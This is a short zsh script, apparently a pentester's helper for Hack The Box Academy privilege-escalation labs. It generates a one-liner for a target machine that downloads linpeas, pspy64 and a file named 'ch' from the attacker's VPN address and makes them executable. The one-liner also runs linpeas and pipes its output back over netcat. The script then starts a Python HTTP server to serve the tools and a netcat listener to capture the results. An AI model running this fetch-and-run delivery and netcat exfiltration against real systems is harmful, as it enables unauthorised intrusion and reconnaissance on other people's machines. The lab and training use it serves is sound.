#! /bin/zsh
YELLOW="\e[1;33m"
NC="\e[0m"

vared -p "[*] Enter a name for a Linpeas scan (optional): " -c scanName

my_vpn_ip=`ip addr show dev tun0 | grep -oP 'inet \K[\d.]+'`

echo -n "Run the following commands in a target's machine shell terminal:\n"
printf "${YELLOW}wget http://${my_vpn_ip}:9999/linpeas.sh;chmod +x ./linpeas.sh; sh ./linpeas.sh |\
 nc -q 5 ${my_vpn_ip} 10000; wget http://${my_vpn_ip}:9999/ch; chmod +x ./ch; wget\
 http://$my_vpn_ip:9999/pspy64; chmod +x ./pspy64${NC}\n"
echo -n "wget http://$my_vpn_ip:9999/linpeas.sh;chmod +x ./linpeas.sh; sh ./linpeas.sh |\
 nc -q 5 $my_vpn_ip 10000; wget http://$my_vpn_ip:9999/ch; chmod +x ./ch; wget\
 http://$my_vpn_ip:9999/pspy64; chmod +x ./pspy64\n" | xclip -selection clipboard
echo
echo "The above oneliner also has been copied to your clipboard."
echo
echo 'Press any key to run an http server and a netcat listener...'; read -k1 -s
tmux split-window 
tmux send -t 1 'cd /home/shyngys/labs/HTB/Academy/linux-privesc; /bin/python3 -m http.server 9999' ENTER
tmux send -t 0 "/bin/nc -lvnp 10000 | tee /home/shyngys/linpeas-logs/privesc-${scanName}$(date '+%d-%m-%Y').log" ENTER